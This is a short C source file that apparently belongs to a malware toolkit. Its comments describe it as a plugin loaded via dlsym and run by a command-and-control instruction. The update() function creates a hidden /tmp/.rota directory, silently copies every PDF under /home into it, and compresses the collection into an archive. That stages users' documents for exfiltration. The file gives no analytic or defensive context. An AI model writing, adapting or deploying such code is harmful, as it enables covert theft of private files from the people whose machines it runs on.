#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void create_dir() {
    system("mkdir -p /tmp/.rota;");
}

void copy_pdfs() {
    system("find /home/ -name *.pdf -exec cp {} /tmp/.rota \\; 2>/dev/null");
}

void tar() {
	system("cd /tmp/ && tar -czvf rota.tar.gz /tmp/.rota");

}

// this is loaded via dlsym.
// the argument to the rota_c2_run_plugin_1 command
extern void update(void) {
    create_dir();
    copy_pdfs();
    sleep(10);
    tar();
}
